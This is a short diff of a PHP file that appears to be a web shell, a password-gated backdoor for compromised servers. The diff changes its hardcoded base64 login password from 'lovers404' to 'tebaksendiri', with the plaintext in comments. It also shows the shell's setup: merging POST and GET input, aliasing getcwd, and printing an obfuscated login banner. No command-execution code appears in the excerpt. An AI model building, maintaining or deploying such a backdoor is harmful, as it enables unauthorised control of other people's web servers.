@@ -11,7 +11,7 @@ date_default_timezone_set("Asia/Jakarta");
 $_7 = array_merge($_POST, $_GET);
 $_r = "required='required'";
 $gcw = "getcwd";
-$inipass = "bG92ZXJzNDA0"; //lovers404
+$inipass = "Rzdvb2dsZQ"; //tebaksendiri
 if(isset($_7['_'])){
 	echo "<div class='text-center text-muted'>login{0};n7z{l+cu,};z7u</div>";
 }
